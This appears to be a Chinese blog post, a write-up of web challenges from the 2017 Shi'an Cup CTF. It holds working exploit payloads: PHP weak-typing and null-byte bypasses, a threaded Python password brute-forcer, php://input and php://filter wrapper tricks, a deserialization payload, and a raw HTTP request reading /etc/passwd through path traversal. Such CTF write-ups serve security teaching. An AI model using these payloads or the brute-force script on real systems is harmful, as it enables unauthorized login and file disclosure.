@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,writeup," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="1. ctf 入门级题目下源代码，发现可以利用ereg的00截断漏洞，burpsuite发送get请求/shian-rao/?password=1%00–  2. 曲奇饼访问，一段不知名文字，然后发现网址/shian-quqi/index.php?line=&amp;amp;file=a2V5LnR4dA== file参数明显base64加密过，base64解密为key.txt，然后我们修改为index.">
+<meta name="keywords" content="ctf,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="世安杯-ctf-2017">
+<meta property="og:url" content="http://ultramangaia.github.io/blog/2017/世安杯-ctf-2017.html">
+<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
+<meta property="og:description" content="1. ctf 入门级题目下源代码，发现可以利用ereg的00截断漏洞，burpsuite发送get请求/shian-rao/?password=1%00–  2. 曲奇饼访问，一段不知名文字，然后发现网址/shian-quqi/index.php?line=&amp;amp;file=a2V5LnR4dA== file参数明显base64加密过，base64解密为key.txt，然后我们修改为index.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ultramangaia.github.io/img/shianbei/1.png">
+<meta property="og:image" content="http://ultramangaia.github.io/img/shianbei/2.png">
+<meta property="og:image" content="http://ultramangaia.github.io/img/shianbei/3.png">
+<meta property="og:image" content="http://ultramangaia.github.io/img/shianbei/6.png">
+<meta property="og:image" content="http://ultramangaia.github.io/img/shianbei/4.png">
+<meta property="og:image" content="http://ultramangaia.github.io/img/shianbei/5.png">
+<meta property="og:image" content="http://ultramangaia.github.io/img/shianbei/5.png">
+<meta property="og:updated_time" content="2017-12-23T12:06:57.082Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="世安杯-ctf-2017">
+<meta name="twitter:description" content="1. ctf 入门级题目下源代码，发现可以利用ereg的00截断漏洞，burpsuite发送get请求/shian-rao/?password=1%00–  2. 曲奇饼访问，一段不知名文字，然后发现网址/shian-quqi/index.php?line=&amp;amp;file=a2V5LnR4dA== file参数明显base64加密过，base64解密为key.txt，然后我们修改为index.">
+<meta name="twitter:image" content="http://ultramangaia.github.io/img/shianbei/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://ultramangaia.github.io/blog/2017/世安杯-ctf-2017.html"/>
+
+
+
+
+
+  <title>世安杯-ctf-2017 | UltramanGaia's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">UltramanGaia's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/世安杯-ctf-2017.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="UltramanGaia">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="UltramanGaia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">世安杯-ctf-2017</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-27T19:21:19+08:00">
+                2017-11-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="1-ctf-入门级题目"><a href="#1-ctf-入门级题目" class="headerlink" title="1. ctf 入门级题目"></a>1. ctf 入门级题目</h1><p>下源代码，发现可以利用ereg的00截断漏洞，burpsuite发送get请求/shian-rao/?password=1%00–</p>
+<p><img src="/img/shianbei/1.png" alt=""></p>
+<h1 id="2-曲奇饼"><a href="#2-曲奇饼" class="headerlink" title="2. 曲奇饼"></a>2. 曲奇饼</h1><p>访问，一段不知名文字，然后发现网址/shian-quqi/index.php?line=&amp;file=a2V5LnR4dA==</p>
+<p>file参数明显base64加密过，base64解密为key.txt，然后我们修改为index.php，base64加密，加上line参数可以遍历index.php文件。得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=base64_decode(isset($_GET[&apos;file&apos;])?$_GET[&apos;file&apos;]:&quot;&quot;);</span><br><span class="line">$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0;</span><br><span class="line">if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;file=a2V5LnR4dA==&quot;);</span><br><span class="line">$file_list = array(</span><br><span class="line">&apos;0&apos; =&gt;&apos;key.txt&apos;,</span><br><span class="line">&apos;1&apos; =&gt;&apos;index.php&apos;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&apos;key&apos;]) &amp;&amp; $_COOKIE[&apos;key&apos;]==&apos;li_lr_480&apos;)&#123;</span><br><span class="line">$file_list[2]=&apos;thisis_flag.php&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line">echo $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>容易发现只要将file参数值改为thisis_flag.php的base64后的值，并且添加cookie</p>
+<p><img src="/img/shianbei/2.png" alt=""></p>
+<h1 id="3-类型"><a href="#3-类型" class="headerlink" title="3. 类型"></a>3. 类型</h1><p>直接给了源码，通过php的弱类型漏洞绕过就好。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$a=0;</span><br><span class="line">$b=0;</span><br><span class="line">$c=0;</span><br><span class="line">$d=0;</span><br><span class="line">if (isset($_GET[&apos;x1&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">        $x1 = $_GET[&apos;x1&apos;];</span><br><span class="line">        $x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL;</span><br><span class="line">        switch ($x1)</span><br><span class="line">        &#123;</span><br><span class="line">        case 0:</span><br><span class="line">        case 1:</span><br><span class="line">                $a=1;</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$x2=(array)json_decode(@$_GET[&apos;x2&apos;]);</span><br><span class="line">if(is_array($x2))&#123;</span><br><span class="line">    is_numeric(@$x2[&quot;x21&quot;])?die(&quot;ha?&quot;):NULL;</span><br><span class="line">    if(@$x2[&quot;x21&quot;])&#123;</span><br><span class="line">        ($x2[&quot;x21&quot;]&gt;2017)?$b=1:NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    if(is_array(@$x2[&quot;x22&quot;]))&#123;</span><br><span class="line">        if(count($x2[&quot;x22&quot;])!==2 OR !is_array($x2[&quot;x22&quot;][0])) die(&quot;ha?&quot;);</span><br><span class="line">        $p = array_search(&quot;XIPU&quot;, $x2[&quot;x22&quot;]);</span><br><span class="line">        $p===false?die(&quot;ha?&quot;):NULL;</span><br><span class="line">        foreach($x2[&quot;x22&quot;] as $key=&gt;$val)&#123;</span><br><span class="line">            $val===&quot;XIPU&quot;?die(&quot;ha?&quot;):NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        $c=1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$x3 = $_GET[&apos;x3&apos;];</span><br><span class="line">if ($x3 != &apos;15562&apos;) &#123;</span><br><span class="line">    if (strstr($x3, &apos;XIPU&apos;)) &#123;</span><br><span class="line">        if (substr(md5($x3),8,16) == substr(md5(&apos;15562&apos;),8,16)) &#123;</span><br><span class="line">            $d=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123;</span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>“==”弱类型，则x1=b，<br>“is_numeric“ 直接用2018bcd绕过，后面比较的时候转换为数值2018，得b1=1<br>“array_search“弱类型漏洞，”XIPU”字符串转数字为0，然后后面的“$var===’XIPU’”由于会检查类型，所以可以绕过<br>所以可以构造x2={“x21”:”2018a”,”x22”:[[0,1],0]}<br>后面的md5直接爆破即可，x3=XIPU18570</p>
+<p><img src="/img/shianbei/3.png" alt=""></p>
+<h1 id="4-登录"><a href="#4-登录" class="headerlink" title="4. 登录"></a>4. 登录</h1><p>用户名默认了，密码看网页源代码有提示说为5位数字，验证码是非图片验证码，直接可以拿到<br>所以，爆破吧，生成一个00000-99999的字典，一个get拿到验证码，然后一个get测试一个密码，然后，建议开个多线程。<br>这里直接利用工具了，pkav HHTP Fuzzer<br><img src="/img/shianbei/6.png" alt=""></p>
+<p>或者 脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import urllib, urllib2</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">def get(begin):</span><br><span class="line">	right = 0</span><br><span class="line">	index = begin * 10000</span><br><span class="line">	while index &lt; (begin + 1) * 10000:</span><br><span class="line">		URL = &apos;http://ctf1.shiyanbar.com/shian-s/index.php&apos;;</span><br><span class="line">		opener = urllib2.build_opener()</span><br><span class="line">		opener.addheaders.append((&apos;Cookie&apos;, &apos;PHPSESSID=45cehecb1jv2jlsi591hv8l0m&apos; + str(begin)))</span><br><span class="line">		try:</span><br><span class="line">			response = opener.open(URL)</span><br><span class="line">		except urllib2.HTTPError, e:</span><br><span class="line">			continue</span><br><span class="line">		data = response.read()</span><br><span class="line">		if re.search(&apos;服务器安全狗防护验证页面&apos;, data) != None:</span><br><span class="line">			continue</span><br><span class="line">		if re.search(&apos;&lt;br&gt;&lt;br&gt;[0-9]*&lt;br&gt;&lt;br&gt;&apos;, data) == None:</span><br><span class="line">			continue</span><br><span class="line">		rcode = re.search(&apos;&lt;br&gt;&lt;br&gt;[0-9]*&lt;br&gt;&lt;br&gt;&apos;, data).group()</span><br><span class="line">		rcode = rcode[8:11]</span><br><span class="line">		# print(index)</span><br><span class="line">		s = str(index)</span><br><span class="line">		if index &lt; 10000:</span><br><span class="line">			s = s.zfill(5)</span><br><span class="line">		password = s</span><br><span class="line">		formdata = &#123;&apos;username&apos;: &apos;admin&apos;, &apos;password&apos;:password, &apos;randcode&apos;:rcode&#125;</span><br><span class="line">		data_encoded = urllib.urlencode(formdata)</span><br><span class="line">		# req = urllib2.Request(URL, param)</span><br><span class="line">		URL += &apos;?&apos; + data_encoded</span><br><span class="line">		# print(URL)</span><br><span class="line">		# opener = urllib2.build_opener()</span><br><span class="line">		opener.addheaders.append((&apos;Cookie&apos;, &apos;PHPSESSID=45cehecb1jv2jlsi591hv8l0m&apos; + str(begin)))</span><br><span class="line">		try:</span><br><span class="line">			response1 = opener.open(URL)</span><br><span class="line">			status = response1.getcode()</span><br><span class="line">			# print(status == 200)</span><br><span class="line">		except urllib2.HTTPError, e:</span><br><span class="line">			continue</span><br><span class="line"></span><br><span class="line">		f1 = open(&apos;log&apos; + str(begin) + &apos;.txt&apos;, &apos;a&apos;)</span><br><span class="line">		f1.write(str(index) + &quot;\n&quot;)</span><br><span class="line">		f1.close()</span><br><span class="line">		data1 = response1.read()</span><br><span class="line">		if re.search(&apos;服务器安全狗防护验证页面&apos;, data1) != None:</span><br><span class="line">			continue</span><br><span class="line">		# print(re.search(&apos;验证码错误&apos;, data1))</span><br><span class="line">		# print(right)</span><br><span class="line">		if status == 200 and re.search(&apos;密码错误&apos;, data1) == None and re.search(&apos;验证码错误&apos;, data1) == None and re.search(&apos;服务器安全狗防护验证页面&apos;, data1) == None:</span><br><span class="line">			if right == 0:</span><br><span class="line">				right = 1</span><br><span class="line">				index -= 1</span><br><span class="line">				# print(&apos;right&apos; + str(index))</span><br><span class="line">			else:</span><br><span class="line">				print(index)</span><br><span class="line">				f = open(&apos;log.txt&apos;, &apos;a&apos;)</span><br><span class="line">				f.write(str(index))</span><br><span class="line">				f.write(data1)</span><br><span class="line">				f.close()</span><br><span class="line">				break</span><br><span class="line">		else:</span><br><span class="line">			right = 0</span><br><span class="line">		index += 1</span><br><span class="line">		# res = urllib2.urlopen</span><br><span class="line"># get(0)</span><br><span class="line">for i in xrange(10):</span><br><span class="line">	t =threading.Thread(target=get,args=(i,))</span><br><span class="line">	t.start()</span><br></pre></td></tr></table></figure></p>
+<h1 id="5-admin"><a href="#5-admin" class="headerlink" title="5. admin"></a>5. admin</h1><p>直接请求，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">you are not admin !</span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
+<p>可以用php伪协议绕过，user=php://input，然后post的数据为the user is admin</p>
+<p>然后，include部分也可以用PHP伪协议读取文件，file=php://filter/convert.base64-encode/resource=index.php</p>
+<p><img src="/img/shianbei/4.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/f1a9/&quot;,$file))&#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file); //class.php</span><br><span class="line">        $pass = unserialize($pass);</span><br><span class="line">        echo $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后发现了class.php，也拿下来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Read&#123;//f1a9.php</span><br><span class="line">    public $file;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;__toString was called!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>看到提示读取f1a9.php</p>
+<p>然后，看到__toString方法和$pass = unserialize($pass);，想到反序列化漏洞，构造如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /shian-du/index.php?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125; HTTP/1.1</span><br><span class="line">Host: ctf1.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: XDEBUG_SESSION=netbeans-xdebug; PHPSESSID=cko7epgroock0vgau9amiri4l5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 17</span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/shianbei/5.png" alt=""></p>
+<p>然后，就想尝试下这个任意文件读取有多大权限，试了下/etc/passwd发现可以读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /shian-du/index.php?user=php://input&amp;file=php://filter/convert.base64-encode/resource=../../../../../etc/passwd HTTP/1.1</span><br><span class="line">Host: ctf1.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://src.shiyanbar.com/student/exam-second/seize-flag</span><br><span class="line">Cookie: XDEBUG_SESSION=netbeans-xdebug; PHPSESSID=cko7epgroock0vgau9amiri4l5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 17</span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure></p>
+<p>然后，发现web都是在同一个服务器上面，尝试读取第一题的index.php看看，<br><img src="/img/shianbei/5.png" alt=""><br>发现可以，那么，原则上，通过这道题就可以直接kill掉所有的web题，具有较大危害（可惜前面的题目都自己已经做出来了）。</p>
+<h1 id="线下赛"><a href="#线下赛" class="headerlink" title="线下赛"></a>线下赛</h1><h2 id="渗透阶段"><a href="#渗透阶段" class="headerlink" title="渗透阶段"></a>渗透阶段</h2><h3 id="第一题："><a href="#第一题：" class="headerlink" title="第一题："></a>第一题：</h3><p>考了后台弱口令，这。。。admin/MetInfo<br>你会发现过不了这个这题就废了</p>
+<h3 id="第二题："><a href="#第二题：" class="headerlink" title="第二题："></a>第二题：</h3><p>phpmyadmin爆破弱口令这。。。root/abc123</p>
+<h3 id="第三题："><a href="#第三题：" class="headerlink" title="第三题："></a>第三题：</h3><p>又是一个wooyun上的已知漏洞利用，额，这个是不给网的，跟现实有点脱离吧</p>
+<h2 id="攻防阶段"><a href="#攻防阶段" class="headerlink" title="攻防阶段"></a>攻防阶段</h2><p>开始几分钟部分队伍未修改默认密码，考的是关于修改默认密码的知识吧，然而刚刚开始的时候服务器很卡很卡，自己都进不去，这。。。<br>Redis<br>和<br>Drupal<br>和<br>FFmpeg<br>的漏洞，嗯，这个的确是平时没有关注到</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/2017/pwn2win-ctf-2017.html" rel="next" title="pwn2win-ctf-2017">
+                <i class="fa fa-chevron-left"></i> pwn2win-ctf-2017
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/2017/gctf-ctf-2017.html" rel="prev" title="gctf-ctf-2017">
+                gctf-ctf-2017 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
